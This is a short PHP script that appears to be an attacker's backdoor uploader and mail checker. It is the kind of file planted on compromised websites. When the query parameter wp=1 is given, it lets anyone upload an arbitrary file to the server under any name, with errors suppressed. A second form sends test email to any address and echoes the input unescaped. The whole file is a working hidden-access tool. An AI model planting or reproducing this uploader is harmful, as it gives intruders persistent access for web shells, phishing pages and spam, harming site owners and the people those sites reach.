<?php
error_reporting(0);
$wp  = $_GET['wp'];
if($wp== '1'){
$wp_ = $_FILES['file']['name'];
$wp__  = $_FILES['file']['tmp_name'];
echo "<form method='POST' enctype='multipart/form-data'>
 <input type='file'name='file' />
 <input type='submit' value='Submit' />
</form>";
move_uploaded_file($wp__,$wp_);
}
?>
Upload is <b><font color='green'>WORKING.</font></b><br>
Check  Mailling ..<br>
<form method="post">
<input type="text" name="email" value="<?php print $_POST['email']?>"required >
<input type="submit" value="Send test >>">
</form>
<br>
<?php
if (!empty($_POST['email'])){
	$xx = rand();
	mail($_POST['email'],"Result Report Test - ".$xx,"WORKING !");
	print "<b>send an report to [".$_POST['email']."] - $xx</b>"; 
}
?>